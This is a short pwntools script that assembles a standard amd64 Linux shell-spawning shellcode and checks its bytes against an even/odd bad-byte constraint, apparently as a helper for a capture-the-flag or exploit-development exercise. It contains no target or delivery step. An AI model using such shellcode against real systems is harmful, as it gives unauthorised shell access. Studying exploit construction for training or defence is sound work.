from pwn import *

context.arch='amd64'
context.os='linux'

shell = asm(shellcraft.sh())

log.info("----------------------------")
log.info("Finding Bad Bytes in Shellcode:")

even_bytes = 0
for b in shell:
    r = (0x123412340000 + b) & 1
    if r==0:
       log.warn("\tBad Byte: %s" %hex(b))
       even_bytes+=1

log.info("----------------------------")
log.info("Total Violations: %i" %even_bytes)
log.info("----------------------------")
log.info(disasm(shell))
log.info("Testing Shellcode Execution")
log.info("----------------------------")
log.info('Shellcode Bytes: %s' %shell)